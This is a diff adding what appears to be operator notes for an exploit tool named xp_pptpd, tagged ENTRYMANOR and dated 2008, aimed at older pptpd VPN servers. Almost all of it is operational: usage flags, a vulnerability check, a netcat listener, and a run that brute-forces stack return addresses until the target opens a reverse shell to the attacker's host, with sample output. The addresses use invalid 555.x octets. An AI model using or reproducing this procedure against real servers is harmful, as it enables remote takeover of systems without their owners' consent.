@@ -1,0 +1,66 @@
+
+###################################################
+### ENTRYMANOR entrymanor binary: xp_pptpd
+###################################################
+2008-01-15 08:15:21 EST 
+
+Usage: ./xp_pptpd -i <pptp_server> -p <pptp_port> -l <localip> -r <localport>
+
+-i target
+-p port <default: 1723>
+-l local IP
+-r local port
+-v verify server
+-t timeout in seconds <default: 1 sec>
+-s stack location <default starts at 0xbfffff00 and ends at 0xbfff0000>
+-h help
+-d debug
+
+Check:
+./xp_pptpd -i 127.0.0.1 -p 1723 -v
+
+Then:
+nc -vv -l -p 5492
+./xp_pptpd -i 127.0.0.1 -p 1723 -l 555.1.2.22 -r 5492
+
+
+
+
+0. will fail on pptpd versions greater than 1.1.4-b3 and 1.1.3-20030409.
+
+
+
+1. Determine if the configuration of the target is exploitable by using the -v option.
+./xp_pptpd -i 127.0.0.1 -p 1723 -v 
+
+
+
+2. (In Window 1, type the following  command)
+
+# nc -vv -l -p 5492
+listening on [any] 5492 ...
+(after several seconds or minutes) ...
+
+555.1.2.171: inverse host lookup failed: Unknown host
+connect to [555.1.2.22] from (UNKNOWN) [555.1.2.171] 1047
+
+(In Window 2, type the following command (use shell if running on linux pitch))
+
+# ./xp_pptpd -i 555.1.2.171 -p 1723 -l 555.1.2.22 -r 5492
+Bruteforcing against 555.1.2.171
+interrupt when you get a shell to 555.1.2.22 on port 5492...
+
+* connecting... [ret=0xbfffff00]..sending done
+* connecting... [ret=0xbffffece]..sending done
+* connecting... [ret=0xbffffe9c]..sending done
+* connecting... [ret=0xbffffe6a]..sending done
+* connecting... [ret=0xbffffe38]..sending done
+* connecting... [ret=0xbffffe06]..sending done
+...
+* connecting... [ret=0xbffff82a]..sending done
+* connecting... [ret=0xbffff7f8]..sending done
+* connecting... [ret=0xbffff7c6]..sending done
+
+(Hit <ctrl> c when you get a connection back in netcat.)
+
+
